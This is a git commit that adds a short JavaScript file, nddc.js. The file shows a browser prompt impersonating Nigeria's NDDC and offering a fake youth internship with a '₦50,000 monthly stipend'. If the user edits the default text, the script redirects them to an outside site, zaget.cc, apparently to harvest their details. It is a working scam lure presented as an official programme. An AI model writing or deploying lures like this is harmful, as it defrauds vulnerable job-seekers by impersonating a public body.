feac1c3cad1d1d7691d90f4dbf9bd653a2323bae
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-21 22:39:25 +0530

    Add files via upload

---
+++ nddc.js
@@ -0,0 +1,5 @@
+var password = 'Receive ₦50,000'
+password=prompt('NDDC: Register now for the ongoing NDDC 1yr youth internship scheme to receive ₦50,000.00 stipend monthly, kindly press Ok to submit your information now ','Receive ₦50,000');
+if (password != 'Receive ₦50,000') {
+location.href='https://zaget.cc/nddc-program.html';
+}
